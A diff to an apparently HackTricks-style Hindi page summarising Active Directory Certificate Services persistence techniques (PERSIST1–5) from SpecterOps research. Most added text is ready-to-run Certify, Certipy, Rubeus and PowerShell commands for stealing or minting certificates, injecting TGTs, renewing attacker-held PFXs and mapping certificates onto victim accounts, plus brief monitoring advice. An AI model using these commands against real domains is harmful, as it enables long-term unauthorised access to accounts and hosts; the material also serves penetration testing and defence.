@@ -2,55 +2,131 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**यह [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) से शानदार शोध के मशीन स्थिरता अध्यायों का एक छोटा सारांश है।**
+**यह [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) से शानदार शोध के खाते की स्थिरता अध्यायों का एक छोटा सारांश है।**
 
-## **प्रमाणपत्रों के साथ सक्रिय उपयोगकर्ता क्रेडेंशियल चोरी को समझना – PERSIST1**
+## Understanding Active User Credential Theft with Certificates – PERSIST1
 
-एक परिदृश्य में जहां एक प्रमाणपत्र जो डोमेन प्रमाणीकरण की अनुमति देता है, एक उपयोगकर्ता द्वारा अनुरोध किया जा सकता है, एक हमलावर के पास इस प्रमाणपत्र को **अनुरोध** करने और **चोरी** करने का अवसर होता है ताकि नेटवर्क पर **स्थिरता बनाए रखी जा सके**। डिफ़ॉल्ट रूप से, Active Directory में `User` टेम्पलेट ऐसे अनुरोधों की अनुमति देता है, हालांकि इसे कभी-कभी अक्षम किया जा सकता है।
+एक परिदृश्य में जहां एक प्रमाणपत्र जो डोमेन प्रमाणीकरण की अनुमति देता है, एक उपयोगकर्ता द्वारा अनुरोध किया जा सकता है, एक हमलावर के पास इस प्रमाणपत्र को अनुरोध करने और चुराने का अवसर होता है ताकि नेटवर्क पर स्थिरता बनाए रखी जा सके। डिफ़ॉल्ट रूप से, Active Directory में `User` टेम्पलेट ऐसे अनुरोधों की अनुमति देता है, हालांकि इसे कभी-कभी अक्षम किया जा सकता है।
 
-एक उपकरण का उपयोग करते हुए जिसका नाम [**Certify**](https://github.com/GhostPack/Certify) है, कोई स्थायी पहुंच सक्षम करने वाले मान्य प्रमाणपत्रों की खोज कर सकता है:
+[Certify](https://github.com/GhostPack/Certify) या [Certipy](https://github.com/ly4k/Certipy) का उपयोग करके, आप सक्षम टेम्पलेट्स की खोज कर सकते हैं जो क्लाइंट प्रमाणीकरण की अनुमति देते हैं और फिर एक का अनुरोध कर सकते हैं:
 ```bash
+# Enumerate client-auth capable templates
 Certify.exe find /clientauth
-```
-यह उजागर किया गया है कि एक प्रमाणपत्र की शक्ति इस बात में है कि यह **उपयोगकर्ता के रूप में प्रमाणित** कर सकता है, जिस पर यह निर्भर करता है, किसी भी पासवर्ड परिवर्तन की परवाह किए बिना, जब तक कि प्रमाणपत्र **मान्य** रहता है।
 
-प्रमाणपत्रों को `certmgr.msc` का उपयोग करके ग्राफिकल इंटरफेस के माध्यम से या `certreq.exe` के साथ कमांड लाइन के माध्यम से अनुरोध किया जा सकता है। **Certify** के साथ, प्रमाणपत्र का अनुरोध करने की प्रक्रिया को इस प्रकार सरल बनाया गया है:
-```bash
-Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME
+# Request a user cert from an Enterprise CA (current user context)
+Certify.exe request /ca:CA-SERVER\CA-NAME /template:User
+
+# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
+certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
 ```
-सफल अनुरोध पर, एक प्रमाणपत्र इसके निजी कुंजी के साथ `.pem` प्रारूप में उत्पन्न होता है। इसे Windows सिस्टम पर उपयोग करने योग्य `.pfx` फ़ाइल में परिवर्तित करने के लिए, निम्नलिखित कमांड का उपयोग किया जाता है:
+एक प्रमाणपत्र की शक्ति इस बात में निहित है कि यह उस उपयोगकर्ता के रूप में प्रमाणीकरण करने में सक्षम है, जिससे यह संबंधित है, भले ही पासवर्ड में परिवर्तन हो, जब तक कि प्रमाणपत्र मान्य है।
+
+आप PEM को PFX में परिवर्तित कर सकते हैं और इसका उपयोग TGT प्राप्त करने के लिए कर सकते हैं:
 ```bash
+# Convert PEM returned by Certify to PFX
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-```
-`.pfx` फ़ाइल को फिर एक लक्षित प्रणाली पर अपलोड किया जा सकता है और उपयोगकर्ता के लिए एक Ticket Granting Ticket (TGT) अनुरोध करने के लिए [**Rubeus**](https://github.com/GhostPack/Rubeus) नामक एक उपकरण के साथ उपयोग किया जा सकता है, हमलावर की पहुँच को तब तक बढ़ाते हुए जब तक प्रमाणपत्र **मान्य** है (आमतौर पर एक वर्ष):
-```bash
-Rubeus.exe asktgt /user:harmj0y /certificate:C:\Temp\cert.pfx /password:CertPass!
-```
-एक महत्वपूर्ण चेतावनी साझा की गई है कि कैसे यह तकनीक, **THEFT5** अनुभाग में वर्णित एक अन्य विधि के साथ मिलकर, एक हमलावर को **NTLM हैश** को लगातार प्राप्त करने की अनुमति देती है बिना Local Security Authority Subsystem Service (LSASS) के साथ इंटरैक्ट किए, और एक गैर-उन्नत संदर्भ से, लंबे समय तक क्रेडेंशियल चोरी के लिए एक अधिक छिपा हुआ तरीका प्रदान करती है।
 
-## **सर्टिफिकेट के साथ मशीन स्थिरता प्राप्त करना - PERSIST2**
+# Use certificate for PKINIT and inject the TGT
+Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt
 
-एक अन्य विधि में एक समझौता किए गए सिस्टम के मशीन खाते के लिए एक सर्टिफिकेट के लिए नामांकन करना शामिल है, डिफ़ॉल्ट `Machine` टेम्पलेट का उपयोग करते हुए जो ऐसी क्रियाओं की अनुमति देता है। यदि एक हमलावर किसी सिस्टम पर उन्नत विशेषाधिकार प्राप्त करता है, तो वे **SYSTEM** खाते का उपयोग करके सर्टिफिकेट के लिए अनुरोध कर सकते हैं, जो एक प्रकार की **स्थिरता** प्रदान करता है:
+# Or with Certipy
+certipy auth -pfx user.pfx -dc-ip 10.0.0.10
+```
+> नोट: अन्य तकनीकों के साथ मिलकर (देखें THEFT अनुभाग), प्रमाणपत्र-आधारित प्रमाणीकरण बिना LSASS को छुए और यहां तक कि गैर-उन्नत संदर्भों से स्थायी पहुंच की अनुमति देता है।
+
+## प्रमाणपत्रों के साथ मशीन स्थिरता प्राप्त करना - PERSIST2
+
+यदि एक हमलावर के पास एक होस्ट पर उन्नत विशेषाधिकार हैं, तो वे डिफ़ॉल्ट `Machine` टेम्पलेट का उपयोग करके समझौता किए गए सिस्टम के मशीन खाते के लिए एक प्रमाणपत्र के लिए नामांकन कर सकते हैं। मशीन के रूप में प्रमाणीकरण करने से स्थानीय सेवाओं के लिए S4U2Self सक्षम होता है और यह स्थायी होस्ट स्थिरता प्रदान कर सकता है:
 ```bash
+# Request a machine certificate as SYSTEM
 Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine
+
+# Authenticate as the machine using the issued PFX
+Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
 ```
-यह पहुँच हमलावर को मशीन खाते के रूप में **Kerberos** में प्रमाणीकरण करने और मेज़बान पर किसी भी सेवा के लिए Kerberos सेवा टिकट प्राप्त करने के लिए **S4U2Self** का उपयोग करने की अनुमति देती है, जिससे हमलावर को मशीन पर स्थायी पहुँच मिलती है।
+## Extending Persistence Through Certificate Renewal - PERSIST3
 
-## **प्रमाणपत्र नवीनीकरण के माध्यम से स्थिरता बढ़ाना - PERSIST3**
+प्रमाणपत्र टेम्पलेट्स की वैधता और नवीनीकरण अवधि का दुरुपयोग एक हमलावर को दीर्घकालिक पहुंच बनाए रखने की अनुमति देता है। यदि आपके पास एक पूर्व में जारी किया गया प्रमाणपत्र और इसका निजी कुंजी है, तो आप इसे समाप्ति से पहले नवीनीकरण कर सकते हैं ताकि बिना मूल प्रिंसिपल से जुड़े अतिरिक्त अनुरोध कलाकृतियों को छोड़े एक नया, दीर्घकालिक प्रमाणपत्र प्राप्त कर सकें।
+```bash
+# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
+# Provide the existing PFX and target the same CA/template when possible
+certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
+-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx
 
-अंतिम विधि में प्रमाणपत्र टेम्पलेट्स की **वैधता** और **नवीनीकरण अवधि** का लाभ उठाना शामिल है। एक प्रमाणपत्र को इसके समाप्ति से पहले **नवीनीकरण** करके, एक हमलावर Active Directory में प्रमाणीकरण बनाए रख सकता है बिना अतिरिक्त टिकट नामांकन की आवश्यकता के, जो प्रमाणपत्र प्राधिकरण (CA) सर्वर पर निशान छोड़ सकता है।
+# Native Windows renewal with certreq
+# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
+certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
+```
+> संचालन टिप: हमलावर-धारित PFX फ़ाइलों पर जीवनकाल को ट्रैक करें और जल्दी नवीनीकरण करें। नवीनीकरण से अपडेट किए गए प्रमाणपत्रों में आधुनिक SID मैपिंग एक्सटेंशन शामिल हो सकता है, जिससे वे सख्त DC मैपिंग नियमों के तहत उपयोगी बने रहते हैं (अगले अनुभाग को देखें)।
 
-### Certify 2.0 के साथ प्रमाणपत्र नवीनीकरण
+## स्पष्ट प्रमाणपत्र मैपिंग लगाना (altSecurityIdentities) – PERSIST4
 
-**Certify 2.0** के साथ, नवीनीकरण कार्यप्रवाह पूरी तरह से नए `request-renew` कमांड के माध्यम से स्वचालित है। एक पूर्व में जारी किए गए प्रमाणपत्र (जो **base-64 PKCS#12** प्रारूप में है) को हमलावर बिना मूल मालिक के साथ बातचीत किए नवीनीकरण कर सकता है - चुपके, दीर्घकालिक स्थिरता के लिए एकदम सही:
+यदि आप एक लक्षित खाते के `altSecurityIdentities` विशेषता में लिख सकते हैं, तो आप एक हमलावर-नियंत्रित प्रमाणपत्र को उस खाते के साथ स्पष्ट रूप से मैप कर सकते हैं। यह पासवर्ड परिवर्तनों के पार बना रहता है और, जब मजबूत मैपिंग प्रारूपों का उपयोग किया जाता है, तो आधुनिक DC प्रवर्तन के तहत कार्यात्मक रहता है।
+
+उच्च-स्तरीय प्रवाह:
+
+1. एक क्लाइंट-प्रमाणित प्रमाणपत्र प्राप्त करें या जारी करें जिसे आप नियंत्रित करते हैं (जैसे, `User` टेम्पलेट के रूप में स्वयं को नामांकित करें)।
+2. प्रमाणपत्र से एक मजबूत पहचानकर्ता निकालें (Issuer+Serial, SKI, या SHA1-PublicKey)।
+3. उस पहचानकर्ता का उपयोग करके पीड़ित प्रमुख के `altSecurityIdentities` पर एक स्पष्ट मैपिंग जोड़ें।
+4. अपने प्रमाणपत्र के साथ प्रमाणीकरण करें; DC इसे स्पष्ट मैपिंग के माध्यम से पीड़ित के साथ मैप करता है।
+
+उदाहरण (PowerShell) एक मजबूत Issuer+Serial मैपिंग का उपयोग करते हुए:
 ```powershell
-Certify.exe request-renew --ca SERVER\\CA-NAME \
---cert-pfx MIACAQMwgAYJKoZIhvcNAQcBoIAkgA...   # original PFX
+# Example values - reverse the issuer DN and serial as required by AD mapping format
+$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
+$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
+$Map     = "X509:<I>$Issuer<SR>$SerialR"
+
+# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
+Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 ```
-यह कमांड एक नया PFX लौटाएगा जो एक और पूर्ण जीवनकाल अवधि के लिए मान्य है, जिससे आपको पहले प्रमाणपत्र के समाप्त या रद्द होने के बाद भी प्रमाणीकरण जारी रखने की अनुमति मिलती है।
+फिर अपने PFX के साथ प्रमाणीकरण करें। Certipy सीधे TGT प्राप्त करेगा:
+```bash
+certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
+```
+Notes
+- केवल मजबूत मैपिंग प्रकारों का उपयोग करें: X509IssuerSerialNumber, X509SKI, या X509SHA1PublicKey। कमजोर प्रारूप (Subject/Issuer, Subject-only, RFC822 ईमेल) अप्रचलित हैं और DC नीति द्वारा ब्लॉक किए जा सकते हैं।
+- प्रमाणपत्र श्रृंखला को DC द्वारा विश्वसनीय रूट पर बनाना चाहिए। NTAuth में एंटरप्राइज CA आमतौर पर विश्वसनीय होते हैं; कुछ वातावरण सार्वजनिक CA को भी विश्वसनीय मानते हैं।
+
+कमजोर स्पष्ट मैपिंग और हमले के रास्तों के बारे में अधिक जानकारी के लिए देखें:
+
+{{#ref}}
+domain-escalation.md
+{{#endref}}
+
+## Enrollment Agent as Persistence – PERSIST5
+
+यदि आप एक मान्य प्रमाणपत्र अनुरोध एजेंट/एनरोलमेंट एजेंट प्रमाणपत्र प्राप्त करते हैं, तो आप इच्छानुसार उपयोगकर्ताओं की ओर से नए लॉगिन-योग्य प्रमाणपत्र बना सकते हैं और एजेंट PFX को ऑफ़लाइन एक स्थायी टोकन के रूप में रख सकते हैं। दुरुपयोग कार्यप्रवाह:
+```bash
+# Request an Enrollment Agent cert (requires template rights)
+Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"
+
+# Mint a user cert on behalf of another principal using the agent PFX
+Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
+/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass
+
+# Or with Certipy
+certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
+-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
+```
+एजेंट प्रमाणपत्र या टेम्पलेट अनुमतियों की निरस्तीकरण इस स्थायीता को समाप्त करने के लिए आवश्यक है।
+
+## 2025 मजबूत प्रमाणपत्र मैपिंग प्रवर्तन: स्थायीता पर प्रभाव
+
+Microsoft KB5014754 ने डोमेन नियंत्रकों पर मजबूत प्रमाणपत्र मैपिंग प्रवर्तन पेश किया। 11 फरवरी, 2025 से, DCs डिफ़ॉल्ट रूप से पूर्ण प्रवर्तन पर हैं, कमजोर/अस्पष्ट मैपिंग को अस्वीकार करते हैं। व्यावहारिक निहितार्थ:
+
+- 2022 से पहले के प्रमाणपत्र जो SID मैपिंग एक्सटेंशन की कमी रखते हैं, पूर्ण प्रवर्तन में DCs के दौरान अप्रत्यक्ष मैपिंग में विफल हो सकते हैं। हमलावर AD CS के माध्यम से प्रमाणपत्रों को नवीनीकरण करके (SID एक्सटेंशन प्राप्त करने के लिए) या `altSecurityIdentities` में एक मजबूत स्पष्ट मैपिंग लगाकर (PERSIST4) पहुंच बनाए रख सकते हैं।
+- मजबूत प्रारूपों (Issuer+Serial, SKI, SHA1-PublicKey) का उपयोग करते हुए स्पष्ट मैपिंग काम करना जारी रखती है। कमजोर प्रारूप (Issuer/Subject, Subject-only, RFC822) को अवरुद्ध किया जा सकता है और स्थायीता के लिए इससे बचना चाहिए।
+
+प्रशासकों को निम्नलिखित पर निगरानी और अलर्ट करना चाहिए:
+- `altSecurityIdentities` में परिवर्तन और नामांकन एजेंट और उपयोगकर्ता प्रमाणपत्रों के जारी करने/नवीनीकरण।
+- CA जारी करने के लॉग पर प्रतिनिधित्व अनुरोधों और असामान्य नवीनीकरण पैटर्न के लिए।
 
 ## संदर्भ
 
-- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
+- Microsoft. KB5014754: Windows डोमेन नियंत्रकों पर प्रमाणपत्र-आधारित प्रमाणीकरण में परिवर्तन (प्रवर्तन समयरेखा और मजबूत मैपिंग)।
+https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
+- Certipy Wiki – कमांड संदर्भ (`req -renew`, `auth`, `shadow`)।
+https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
 
 {{#include ../../../banners/hacktricks-training.md}}
